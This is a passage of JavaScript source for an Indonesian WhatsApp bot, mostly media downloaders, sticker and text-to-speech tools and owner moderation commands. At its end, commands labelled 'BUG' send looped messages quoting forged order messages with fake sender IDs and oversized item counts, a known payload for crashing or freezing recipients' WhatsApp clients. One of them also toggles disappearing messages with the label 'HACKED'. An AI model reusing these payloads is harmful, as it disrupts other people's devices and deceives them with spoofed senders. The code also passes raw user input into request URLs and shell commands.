                        await aldi.sendMessage(from, bufflgi, audio).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(aml.erro)
                        }
                   await limitAdd(sender)
                break
case 'facebook':
case 'fb':
if (!isGroup) return reply(aml.groupo)
if (!isRegistered) return reply(aml.noregis)
if (isLimit(sender)) return reply(aml.limitend)
if (isBanned) return reply(aml.baned)            
if (!q) return reply(aml.wrongf)
if(!isUrl(args[0]) && !args[0].includes('facebook')) return reply(aml.Iv)
teks = args[0]
reply(aml.wait)
res = await fbDown(teks).catch(e => {
reply(`${e}`)
})
a = res[0]
result = `「 *Facebook Downloader* 」

• *Judul:* ${a.judul}
• *Source :* ${a.source}
• *Ukuran :* ${a.size}
• *Link :* ${a.link}
• *Kualitas :* ${a.quality}
• *Type :* ${a.type}
• *Nama File :* ${a.judul}.${a.type}`
aldi.sendMessage(a.thumb, image, {caption: result, quoted: mek})
await aldi.sendMessage(a.link, video, {mimetype: 'video/mp4',quoted: mek})
break
                case 'play2':
            if (!isRegistered) return reply(aml.noregis)
                if (isLimit(sender)) return reply(aml.limitend)
                if (isBanned) return reply(aml.baned)            
            if (args.length === 1) return reply(`Kirim perintah *${prefix}video* _Judul video yang akan dicari_`)
            srch = q
            aramas = await yts(srch);
            aramat = aramas.all 
            mulaikah = aramat[0].url    
                    reply (aml.wait)                            
                    ytv(mulaikah)                            
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async(a) => {
                    //   if (Number(filesize) >= 100000) return aldi.sendMessage(from, thumb, `*「 PLAY VIDEO 」*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*「 PLAY VIDEO 」*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        var buffimg = await getBuffer(thumb)
                        var bufflgi = await getBuffer(dl_link)
                        aldi.sendMessage(from, buffimg, image, {caption: captions})
                        await aldi.sendMessage(from, bufflgi, video).catch(() => reply('error'))
                        })
                        })                
                        break
                case 'ytaudio':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length < 1) return reply('Urlnya mana um?')
                    anu = await fetchJson(`https://rr018-apii.herokuapp.com/api/download/ytmp3?url=${body.slice(7)}&apikey=Administrator`)
                    if (anu.error) return reply(anu.error)
                    reply (aml.wait)
                    ingfomp3 = `Lagu Ditemukan\n➸ Judul : ${anu.title}\n\nProses`
                    error = await getBuffer(anu.thumb)
                    lagu = await getBuffer(anu.result)
                    aldi.sendMessage(from, error, image, {quoted: ftoko, caption: ingfomp3})
                    aldi.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', quoted: fkontak})
                    await limitAdd(sender)
                    break
           case 'ytplay2':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Example: ${prefix + command} mekukis Senja`)
                    reply('Tunggu masih mencari data-data')
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytplay2?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    ini_kontol = await getBuffer(get_result.thumbnail)
                    aldi.sendMessage(from, ini_kontol, image, { quoted: fkontak, caption: get_result.title })
                    get_audio = await getBuffer(get_result.audio)
                    aldi.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, filename: `${get_result.title}.mp3`, quoted: fkontak})
                    get_video = await getBuffer(get_result.video)
                    aldi.sendMessage(from, get_video, video, { mimetype: Mimetype.mp4, filename: `${get_result.title}.mp4`, quoted: fkontak})
                    await limitAdd(sender)
                    break
                case 'yt4':
                    if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
				    reply('Tunggu masih mencari data-data')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytvideo?apikey=${lolhuman}&url=${ini_link}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Uploader : ${get_result.uploader}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Description :\n ${get_result.description}`
                    ini_kontol = await getBuffer(get_result.thumbnail)
                    aldi.sendMessage(from, ini_kontol, image, { quoted: fkontak, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link[0].link)
                    aldi.sendMessage(from, get_audio, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: fkontak})
                    await limitAdd(sender)
                    break
                case 'ytmp42':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
				    reply (aml.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytvideo2?apikey=${lolhuman}&url=${ini_link}`)
                    get_result = get_result.result
                    ini_txt = `${get_result.title} - ${get_result.size}`
                    ini_kontol = await getBuffer(get_result.thumbnail)
                    aldi.sendMessage(from, ini_kontol, image, { quoted: fkontak, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link)
                    aldi.sendMessage(from, get_audio, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: fkontak})
                    await limitAdd(sender)
                    break
                case 'darkneon':
                case 'candlemug':
                case 'lovemsg':
                case 'mugflower':
                case 'narutobanner':
                case 'paperonglass':
                case 'romancetext':
                case 'shadowtext':
                case 'underwater':
                case 'hpotter':
                case 'woodblock':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nContoh: ${prefix + command} FvnkyStore`)
                    txt = args.join('  ')
                    reply (aml.wait)
                    katay = await getBuffer(`https://videfikri.com/api/textmaker/${command}/?text=${txt}`)
                    aldi.sendMessage(from, katay, image, {caption: 'Nih kak.. Jangan lupa subscribe aldiFvnky', quoted: fkontak})
                    await limitAdd(sender)
                    break               
		case 'lirik':    
				     if (!isGroup) return reply(aml.groupo)
                 	if (!isRegistered) return reply(aml.noregis)
		             if (isBanned) return reply(aml.baned)
                 	if (isLimit(sender)) return reply(aml.limitend)
                 	reply (aml.wait)
					 teks = body.slice(7)
					 anu = await fetchJson(`http://scrap.terhambar.com/lirik?word=${teks}`, {method: 'get'})
					 reply('Lirik dari lagu '+teks+' adalah :\n\n'+anu.result.lirik)
					 await limitAdd(sender) 
					break 
                case 'text3d':
                     if (!isGroup) return reply(aml.groupo)
                     if (!isRegistered) return reply(aml.noregis)
		             if (isBanned) return reply(aml.baned)
                     if (isLimit(sender)) return reply(aml.limitend)
              	   if (args.length < 1) return reply('teksnya mana Tod?')
                    teks = `${body.slice(8)}`
                    if (teks.length > 10) return aldi.sendMessage(from, 'Teksnya kepanjangan Bambank', text, {quoted: fkontak})
                    kontol = await getBuffer(`https://docs-jojo.herokuapp.com/api/text3d?text=${teks}`, {method: 'get'})
                    aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: `${teks}`})
			     	await limitAdd(sender)
					break
			    case 'fototiktok':
			        if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
                    gatauda = body.slice(12)
                    anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/tiktokpp?user=${gatauda}` , {method: 'get'})
			        kontol = await getBuffer(anu.result)
                    reply(kontol)
			        await limitAdd(sender)
					break
			    case 'map':
			    if (!isGroup) return reply(aml.groupo)
			    if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
                anu = await fetchJson(`https://mnazria.herokuapp.com/api/maps?search=${body.slice(5)}`, {method: 'get'})
                kontol = await getBuffer(anu.gambar)
                aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: `${body.slice(5)}`})
				await limitAdd(sender)
					break
                case 'kbbi':
                    if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Apa yang mau dicari um?')
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
					reply('Menurut Kbbi:\n\n'+anu.result)
					await limitAdd(sender)
					break
                case 'artinama':
                if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Apa yang mau dicari um?')
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${args.join('  ')}`, {method: 'get'})
					reply('Menurut nama:\n\n'+anu.result)
					await limitAdd(sender)
					break
			//tools
			case 'qrcode':
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
			if (isLimit(sender)) return reply(aml.limitend)
			const tex = encodeURIComponent(body.slice(8))
			if (!tex) return aldi.sendMessage(from, 'MASUKAN URL/TEKS UNTUK DI JADIKAN QR', text, {quoted: fkontak})
			const kontoler = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${tex}`)
			aldi.sendMessage(from, kontoler, image, {quoted: fkontak})
			await limitAdd(sender)
			break
				case 'moddroid':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
			data = await fetchJson(`https://tobz-api.herokuapp.com/api/moddroid?q=${args.join('  ')}&apikey=${TobzKey}`)
			hepi = data.result[0] 
			teks = `Nama: ${data.result[0].title}\npublisher: ${hepi.publisher}\nmod info: ${hepi.mod_info}\nsize: ${hepi.size}\nlatest version: ${hepi.latest_version}\ngenre: ${hepi.genre}\nlink: ${hepi.link}\ndownload: ${hepi.download}`
			Buffer = await getBuffer(hepi.image)
			aldi.sendMessage(from, Buffer, image, {quoted: ftoko, caption: `${teks}`})
			await limitAdd(sender)
			break
				case 'happymod':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
			data = await fetchJson(`https://tobz-api.herokuapp.com/api/happymod?q=${args.join('  ')}&apikey=${TobzKey}`)
			hupo = data.result[0] 
			teks = `Nama: ${data.result[0].title}\nversion: ${hupo.version}\nsize: ${hupo.size}\nroot: ${hupo.root}\npurchase: ${hupo.price}\nlink: ${hupo.link}\ndownload: ${hupo.download}`
			Ehy = await getBuffer(hupo.image)
			aldi.sendMessage(from, Ehy, image, {quoted: ftoko, caption: `${teks}`})
			await limitAdd(sender)
			break
				case 'ocr': 
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await aldi.downloadAndSaveMediaMessage(encmedia)
						reply (aml.wait)
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply('kirim foto dengan caption ${prefix}??𝗰𝗿')
					}
					await limitAdd(sender)
					break
					case 'ban':
					if (!isOwner) return reply(aml.ownerb)
					bnnd = body.slice(6)
					ban.push(`${bnnd}@s.whatsapp.net`)
					fs.writeFileSync('./database/user/banned.json', JSON.stringify(ban))
					reply(`Nomor wa.me/${bnnd} telah dibanned !`)
					break
				case 'unban':
					if (!isOwner) return reply(aml.ownerb)
					bnnd = body.slice(8)
					ban.splice(`${bnnd}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/user/banned.json', JSON.stringify(ban))
					reply(`Nomor wa.me/${bnnd} telah di unban!`)
					break
                 case 'ambil':
					case 'colong':
					if (!isOwner) return reply(aml.ownerb)
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
				   reply (aml.wait)
					if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await aldi.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(`@${bot}`,`${namaowner}`)} ${ran} -o ${ran}`, async (error) => {
									if (error) return reply(ind.stikga())
									aldi.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '393470602054-1351628616@g.us' } : {}) }, message: { 'imageMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/jpeg', 'caption': `${ucapanFakereply}`, 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg')} } } })
									fs.unlinkSync(media)	
									fs.unlinkSync(ran)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await aldi.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`âŒ Gagal, pada saat mengkonversi ${tipe} ke stiker`)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(`@${namabot}`,`${namaowner}`)} ${ran} -o ${ran}`, async (error) => {
									if (error) return reply(ind.stikga())
									aldi.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '393470602054-1351628616@g.us' } : {}) }, message: { 'imageMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/jpeg', 'caption': `${ucapanFakereply}`, 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg')} } } })
									fs.unlinkSync(media)
									fs.unlinkSync(ran)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedSticker) && args[0] == 'nobg') {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await aldi.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						keyrmbg = 'Your-ApiKey'
						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp}).then(res => {
							fs.unlinkSync(media)
							let kontoler = kontoler.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, kontoler, (err) => {
								if (err) return reply('Gagal, Terjadi kesalahan, silahkan kontol beberapa saat lagi.')
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								exec(`webpmux -set exif ${addMetadata('BOT', authorname)} ${ranw} -o ${ranw}`, async (error) => {
									aldi.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '393470602054-1351628616@g.us' } : {}) }, message: { 'imageMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/jpeg', 'caption': `${ucapanFakereply}`, 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg')} } } })
									fs.unlinkSync(ranw)
								})
							})
						})
					} else {
						reply(`reply sticker dengan caption ${prefix}colong`)
					}
					await limitAdd(sender)
					break
				case 'stiker': 
				case 'sticker':
				case 's':
				case 'gifstiker':
                case 'stickergif':
                case 'gifsticker':
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
                    await limitAdd(sender)
                    reply(aml.wait)
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await aldi.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								return reply(ind.stikga())
							})
							.on('end', function () {
								console.log('Finish')
								Buf = fs.readFileSync(ran)
								aldi.sendMessage(from, Buf, sticker, {quoted: fkontak})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await aldi.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
					          reply ('EROR MEMBUAT STICKER')
							})
							.on('end', function () {
								console.log('Finish')
								Buf = fs.readFileSync(ran)
								aldi.sendMessage(from, Buf, sticker, {quoted: fkontak})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
							} else {
						reply(`Kirim gambar/video/gif dengan caption \n${prefix}sticker (durasi sticker video 1-9 detik)`)
					}
					break
				case 'tts':
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
				    if (args.length < 1) return aldi.sendMessage(from, 'Diperlukan kode bahasa!!', text, {quoted: fkontak})
					const gtts = require('./aldiganz/gtts')(args[0])
					if (args.length < 2) return aldi.sendMessage(from, 'Mana teks yang ma di jadiin suara? suara saya kah:v?', text, {quoted: fkontak})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 300
					? reply('lah teks nya kepanjangan bambang😤')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							hio = fs.readFileSync(rano)
							if (err) return reply(ind.stikga())
							aldi.sendMessage(from, hio, audio, {quoted: ftoko, ptt:true})
							fs.unlinkSync(rano)
						})
					})
					await limitAdd(sender)
					break
			case 'say':
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			    	if (isLimit(sender)) return reply(aml.limitend)
					anu = await fetchJson(`https://anuz.herokuapp.com/api/bapakfont?kata=${body.slice(6)}`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender) 
					break 
				case 'setprefix':
					if (args.length < 1) return
					if (!isOwner) return reply(aml.ownerb)
					prefix = args[0]
					reply(`Prefix berhasil di ubah menjadi : ${prefix}`)
					break 
				case 'tiktokstalk':
				 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				try {
						if (args.length < 1) return aldi.sendMessage(from, '𝘂??𝗲??𝗻𝗮𝗺𝗲 𝗺𝗮𝗻𝗮 ?', text, {quoted: fkontak})
						let { user, stats } = await tiktod.getUserProfileInfo(args[0])
						reply (aml.wait)
						teks = `ID : ${user.id}\nUsername : ${user.uniqueId}\nNickname : ${user.nickname}\nFollowers : ${stats.followerCount}\nFollowings : ${stats.followingCount}\nPosts : ${stats.videoCount}\nLuv : ${stats.heart}\n`
						kontol = await getBuffer(user.avatarLarger)
						aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: teks})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('[𝗘𝗥𝗥𝗢𝗥] 𝗸𝗲𝗺𝘂𝗻????𝗶𝗻𝗮𝗻 𝘂𝘀??𝗿??𝗮𝗺𝗲 𝘁𝗶𝗱𝗮𝗸 𝘃𝗮??𝗶??')
					}
					await limitAdd(sender)
					break
                 case 'linkgc':
				    if (!isGroup) return reply(aml.groupo)
				    if (!isGroupAdmins) return reply(aml.admin)
				    if (isLimit(sender)) return reply(aml.limitend)
				    if (!isBotGroupAdmins) return reply(aml.badmin)
				    linkgc = await aldi.groupInviteCode (from)
				    yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group ${groupName}`
				    aldi.sendMessage(from, yeh, text, {quoted: fkontak})
			        await limitAdd(sender)
					break
				case 'tagall':
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `┣➥ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
			case 'clearall':
					if (!isOwner) return reply(aml.ownerb)
					anu = await aldi.chats.all()
					aldi.setMaxListeners(25)
					for (let _ of anu) {
						aldi.deleteChat(_.jid)
					}
					reply(ind.clears())
					break
			       case 'block':
				    aldi.updatePresence(from, Presence.composing) 
				    aldi.chatRead (from)
					if (!isGroup) return reply(aml.groupo)
					if (!isOwner) return reply(aml.ownerb)
					aldi.blockUser (`${body.slice(7)}@c.us`, "add")
					aldi.sendMessage(from, `perintah Diterima, memblokir ${body.slice(7)}@c.us`, text)
					break
                    case 'unblock':
					if (!isGroup) return reply(aml.groupo)
					if (!isOwner) return reply(aml.ownerb)
				    aldi.blockUser (`${body.slice(9)}@c.us`, "remove")
					aldi.sendMessage(from, `Perintah diterima, Membuka ${body.slice(9)}@c.us`, text)
					break
				case 'leave': 
				if (!isGroup) return reply(aml.groupo)
				if (!isOwner) return reply(aml.ownerb)
				await reply(from, 'bye').then(() => aldi.groupLeave(from))
					break 
			case 'delete':
			case 'del':
			case 'd':
			if (!isGroup) return reply(aml.groupo)
                       if (!isGroupAdmins) return reply(aml.admin)
                        if (!isBotGroupAdmins) return reply(aml.badmin)
					aldi.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
					case 'leave': 
				if (!isGroup) return reply(aml.groupo)
				if (!isOwner) return reply(aml.ownerb)
				await reply(from, 'bye').then(() => aldi.groupLeave(from))
					break 
              case 'maintence':
         if (!isOwner) return reply(aml.ownerb) 
         if (args.length < 1) return reply('pilih on atau off')
                if (args[1].toLowerCase() === 'on'){
                    maintence = true
                    pesanmain = body.slice(18) ? body.slice(18) : '-'
                    reply(`Sukses`)
                } else if (args[1].toLowerCase() === 'off'){
                    maintence = false
                    main = []
                    reply(`Sukses`)
                } else {
                    reply(`Pilih mulai/gak`)
                }
                break
                //BUG BY XENN BOT 
                case 'bugpc2':
if (!isOwner) return reply('LU OWNER?')
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
aldi.sendMessage(from, `${NamaBot}`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `${namaowner}`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
case 'bugcombine':
if (!isOwner) return reply ('SoAsik?')
                 aldi.toggleDisappearingMessages(from, 'HACKED')
aldi.sendMessage(from, `${namabot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${namabot}`,
    orderTitle: `${namabot}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    aldi.updatePresence(from, Presence.composing)
	    sendMess(`dahlah`)
	    }, 2000)
	    reply(`dahlah`)
break
case 'buglokasi':
if (!isOwner) return reply ('OwnerBukan?')
aldi.updatePresence(from, Presence.composing)
		       aldi.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${namaowner}`,
						address: `${namabot}`,
                        jpegThumbnail: dfrply },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${namaowner}`,
    orderTitle: `${namabot}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
